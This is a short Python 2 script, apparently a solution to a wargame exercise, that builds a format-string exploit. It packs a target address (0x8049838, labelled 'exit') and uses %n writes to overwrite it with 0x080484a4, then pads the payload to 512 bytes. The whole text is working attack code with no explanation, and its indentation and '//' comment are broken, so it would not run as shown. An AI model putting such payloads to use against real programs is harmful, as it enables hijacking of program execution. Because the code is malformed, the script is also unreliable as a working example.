import struct

// our goal => 0x080484a4
exit = 0x8049838

def padding(str):
    return str + "A" * (512 - (len(str)))

	exploit = ""
	exploit += struct.pack("I", exit)
	exploit += struct.pack("I", exit + 2)
	exploit += "BBBBCCCC"
	exploit += "%4$33940x"
	exploit += "%4$n"
	exploit += "%99168x"
	exploit += "%5$n"

print padding(exploit)
